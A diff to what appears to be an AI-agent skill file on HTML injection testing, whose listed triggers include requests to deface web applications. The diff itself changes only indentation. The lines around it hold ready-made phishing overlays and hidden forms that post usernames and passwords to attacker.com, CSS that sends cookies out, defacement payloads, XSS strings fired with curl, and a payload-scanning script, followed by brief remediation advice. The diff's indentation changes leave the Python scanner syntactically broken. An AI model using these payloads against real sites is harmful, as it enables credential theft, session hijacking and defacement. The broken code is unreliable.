@@ -2,8 +2,8 @@
 name: HTML Injection Testing
 description: This skill should be used when the user asks to "test for HTML injection", "inject HTML into web pages", "perform HTML injection attacks", "deface web applications", or "test content injection vulnerabilities". It provides comprehensive HTML injection attack techniques and testing methodologies.
 metadata:
-  author: zebbern
-  version: "1.1"
+ author: zebbern
+ version: "1.1"
 ---
 
 # HTML Injection Testing
@@ -42,7 +42,7 @@ HTML injection occurs when user input is reflected in web pages without proper s
 ```html
 <!-- Vulnerable code example -->
 <div>
-    Welcome, <?php echo $_GET['name']; ?>
+ Welcome, <?php echo $_GET['name']; ?>
 </div>
 
 <!-- Attack input -->
@@ -50,7 +50,7 @@ HTML injection occurs when user input is reflected in web pages without proper s
 
 <!-- Rendered output -->
 <div>
-    Welcome, <h1>Injected Content</h1>
+ Welcome, <h1>Injected Content</h1>
 </div>
 ```
 
@@ -119,7 +119,7 @@ Test with simple HTML tags:
 
 <!-- Images -->
 <img src="http://attacker.com/image.png">
-<img src="x" onerror="alert(1)">  <!-- XSS attempt -->
+<img src="x" onerror="alert(1)"> <!-- XSS attempt -->
 ```
 
 Testing workflow:
@@ -144,16 +144,16 @@ Payload persists in database:
 <!-- Profile bio injection -->
 Name: John Doe
 Bio: <div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;">
-     <h1>Site Under Maintenance</h1>
-     <p>Please login at <a href="http://attacker.com/login">portal.company.com</a></p>
-     </div>
+ <h1>Site Under Maintenance</h1>
+ <p>Please login at <a href="http://attacker.com/login">portal.company.com</a></p>
+ </div>
 
 <!-- Comment injection -->
 Great article!
 <form action="http://attacker.com/steal" method="POST">
-    <input name="username" placeholder="Session expired. Enter username:">
-    <input name="password" type="password" placeholder="Password:">
-    <input type="submit" value="Login">
+ <input name="username" placeholder="Session expired. Enter username:">
+ <input name="password" type="password" placeholder="Password:">
+ <input type="submit" value="Login">
 </form>
 ```
 
@@ -176,11 +176,11 @@ Payload in POST data:
 ```bash
 # POST injection test
 curl -X POST -d "comment=<div style='color:red'>Malicious Content</div>" \
-     http://target.com/submit
+ http://target.com/submit
 
 # Form field injection
 curl -X POST -d "name=<script>alert(1)</script>&email=test@test.com" \
-     http://target.com/register
+ http://target.com/register
 ```
 
 #### URL-Based Injection
@@ -202,26 +202,26 @@ Create convincing phishing forms:
 ```html
 <!-- Fake login form overlay -->
 <div style="position:fixed;top:0;left:0;width:100%;height:100%;
-            background:white;z-index:9999;padding:50px;">
-    <h2>Session Expired</h2>
-    <p>Your session has expired. Please log in again.</p>
-    <form action="http://attacker.com/capture" method="POST">
-        <label>Username:</label><br>
-        <input type="text" name="username" style="width:200px;"><br><br>
-        <label>Password:</label><br>
-        <input type="password" name="password" style="width:200px;"><br><br>
-        <input type="submit" value="Login">
-    </form>
+ background:white;z-index:9999;padding:50px;">
+ <h2>Session Expired</h2>
+ <p>Your session has expired. Please log in again.</p>
+ <form action="http://attacker.com/capture" method="POST">
+ <label>Username:</label><br>
+ <input type="text" name="username" style="width:200px;"><br><br>
+ <label>Password:</label><br>
+ <input type="password" name="password" style="width:200px;"><br><br>
+ <input type="submit" value="Login">
+ </form>
 </div>
 
 <!-- Hidden credential stealer -->
 <style>
-    input { background: url('http://attacker.com/log?data=') }
+ input { background: url('http://attacker.com/log?data=') }
 </style>
 <form action="http://attacker.com/steal" method="POST">
-    <input name="user" placeholder="Verify your username">
-    <input name="pass" type="password" placeholder="Verify your password">
-    <button>Verify</button>
+ <input name="user" placeholder="Verify your username">
+ <input name="pass" type="password" placeholder="Verify your password">
+ <button>Verify</button>
 </form>
 ```
 
@@ -237,24 +237,24 @@ Website appearance manipulation:
 ```html
 <!-- Full page overlay -->
 <div style="position:fixed;top:0;left:0;width:100%;height:100%;
-            background:#000;color:#0f0;z-index:9999;
-            display:flex;justify-content:center;align-items:center;">
-    <h1>HACKED BY SECURITY TESTER</h1>
+ background:#000;color:#0f0;z-index:9999;
+ display:flex;justify-content:center;align-items:center;">
+ <h1>HACKED BY SECURITY TESTER</h1>
 </div>
 
 <!-- Content replacement -->
 <style>body{display:none}</style>
 <body style="display:block !important">
-    <h1>This site has been compromised</h1>
+ <h1>This site has been compromised</h1>
 </body>
 
 <!-- Image injection -->
 <img src="http://attacker.com/defaced.jpg" 
-     style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">
+ style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">
 
 <!-- Marquee injection (visible movement) -->
 <marquee behavior="alternate" style="font-size:50px;color:red;">
-    SECURITY VULNERABILITY DETECTED
+ SECURITY VULNERABILITY DETECTED
 </marquee>
 ```
 
@@ -265,9 +265,9 @@ Website appearance manipulation:
 ```html
 <!-- Style injection -->
 <style>
-    body { background: url('http://attacker.com/track?cookie='+document.cookie) }
-    .content { display: none }
-    .fake-content { display: block }
+ body { background: url('http://attacker.com/track?cookie='+document.cookie) }
+ .content { display: none }
+ .fake-content { display: block }
 </style>
 
 <!-- Inline style injection -->
@@ -370,28 +370,28 @@ target = "http://target.com/search"
 param = "q"
 
 payloads = [
-    "<h1>Test</h1>",
-    "<b>Bold</b>",
-    "<script>alert(1)</script>",
-    "<img src=x onerror=alert(1)>",
-    "<a href='http://evil.com'>Click</a>",
-    "<div style='color:red'>Styled</div>",
-    "<marquee>Moving</marquee>",
-    "<iframe src='http://evil.com'></iframe>",
+ "<h1>Test</h1>",
+ "<b>Bold</b>",
+ "<script>alert(1)</script>",
+ "<img src=x onerror=alert(1)>",
+ "<a href='http://evil.com'>Click</a>",
+ "<div style='color:red'>Styled</div>",
+ "<marquee>Moving</marquee>",
+ "<iframe src='http://evil.com'></iframe>",
 ]
 
 for payload in payloads:
-    encoded = urllib.parse.quote(payload)
-    url = f"{target}?{param}={encoded}"
-    
-    try:
-        response = requests.get(url, timeout=5)
-        if payload.lower() in response.text.lower():
-            print(f"[+] Possible injection: {payload}")
-        elif "<h1>" in response.text or "<b>" in response.text:
-            print(f"[?] Partial reflection: {payload}")
-    except Exception as e:
-        print(f"[-] Error: {e}")
+ encoded = urllib.parse.quote(payload)
+ url = f"{target}?{param}={encoded}"
+ 
+ try:
+ response = requests.get(url, timeout=5)
+ if payload.lower() in response.text.lower():
+ print(f"[+] Possible injection: {payload}")
+ elif "<h1>" in response.text or "<b>" in response.text:
+ print(f"[?] Partial reflection: {payload}")
+ except Exception as e:
+ print(f"[-] Error: {e}")
 ```
 
 ### Phase 10: Prevention and Remediation
@@ -415,8 +415,8 @@ from html import escape
 safe_output = escape(user_input)
 
 # Python Flask: Auto-escaping
-{{ user_input }}  # Jinja2 escapes by default
-{{ user_input | safe }}  # Marks as safe (dangerous!)
+{{ user_input }} # Jinja2 escapes by default
+{{ user_input | safe }} # Marks as safe (dangerous!)
 ```
 
 ```javascript
@@ -424,7 +424,7 @@ safe_output = escape(user_input)
 element.textContent = userInput;
 
 // JavaScript: innerHTML (dangerous!)
-element.innerHTML = userInput;  // Vulnerable!
+element.innerHTML = userInput; // Vulnerable!
 
 // JavaScript: Sanitize
 const clean = DOMPurify.sanitize(userInput);
